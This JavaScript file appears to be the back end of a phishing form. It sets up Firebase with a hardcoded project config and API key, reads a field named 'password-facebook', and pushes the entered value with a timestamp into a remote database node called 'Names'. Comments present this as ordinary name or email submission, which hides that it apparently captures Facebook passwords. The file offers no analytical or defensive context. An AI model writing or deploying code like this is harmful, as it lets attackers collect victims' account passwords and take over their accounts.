// Initialize Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
    authDomain: "test-for-admin-9c05c.firebaseapp.com",
    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
    projectId: "test-for-admin-9c05c",
    storageBucket: "test-for-admin-9c05c.appspot.com",
    messagingSenderId: "180529484791",
    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference to the input field and error message elements
var inputField = document.getElementById('password-facebook');
var errorMessage = document.getElementById('error-message');
var fadeTimeout;

// Function to check the validity of input and display error if needed
function checkName(name) {
    // Show error message
    function showError() {
        console.log("Please write the name first");
        errorMessage.style.opacity = '1'; // Fade in the error message
        
        // Set timeout to fade out the message after 3 seconds
        fadeTimeout = setTimeout(function() {
            errorMessage.style.opacity = '0'; // Fade out the error message
        }, 3000);
    }

    // If name is empty, show the error and return false
    if (!name) {
        showError();
        console.log("Field is empty!");
        return false;
    }

    // Hide the error message if name is valid
    errorMessage.style.opacity = '0';
    return true;
}

// Function to submit email (or name) to Firebase
function submitEmail() {
    var name = inputField.value;

    // If input is valid, push the data to Firebase
    if (checkName(name)) {
        firebase.database().ref('Names').push({
            name: name,
            timestamp: new Date().toISOString()
        })
        .then(() => {
            console.log('Data saved successfully');
        })
        .catch((error) => {
            console.error('Error occurred:', error);
            errorMessage.textContent = 'Error occurred while saving data!';
            errorMessage.style.opacity = '1'; // Show error message on Firebase error
        });
    }
}

// Add event listener to hide the error message when user starts typing again
inputField.addEventListener('input', function() {
    if (errorMessage.style.opacity === '1') {
        errorMessage.style.opacity = '0'; // Hide the error message immediately
        clearTimeout(fadeTimeout); // Clear the fade-out timeout
    }
});
